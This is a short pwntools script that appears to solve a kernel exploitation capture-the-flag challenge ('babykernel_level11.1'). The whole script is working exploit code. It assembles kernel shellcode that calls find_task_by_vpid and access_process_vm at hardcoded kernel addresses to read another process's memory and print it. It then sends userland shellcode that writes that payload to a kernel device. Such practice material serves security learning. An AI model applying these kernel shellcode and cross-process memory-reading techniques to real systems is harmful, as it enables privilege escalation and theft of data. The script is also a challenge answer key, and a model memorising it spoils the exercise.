from pwn import *

context.arch = "amd64"
# ffffffff810856e0 T find_task_by_vpid
# ffffffff81190040 T access_process_vm

p = process("/challenge/babykernel_level11.1")
pid =  p.pid + 1

ker_byte_codes = asm('''
mov rdi, %s
mov rax, 0xffffffff810856e0
call rax
sub rsp, 0x100
mov rdi, rax
lea rsi, [rip + label + 0x2]
mov rsi, [rsi]
mov rdx, rsp
mov rcx, 0x60
xor r8, r8
mov rax, 0xffffffff81190040
call rax

mov rdi, rsp

mov rax, 0xffffffff810b69a9                     
call rax
add rsp, 0x100 
ret
label:
'''%hex(pid))
byte_codes = asm(
    '''
    pop rax
    push rax
    add rax, 0x263c
    push rax
    ''' +
    shellcraft.write(3, ker_byte_codes, len(ker_byte_codes) + 8) + "pop rax\nret\n")


p.send(byte_codes)
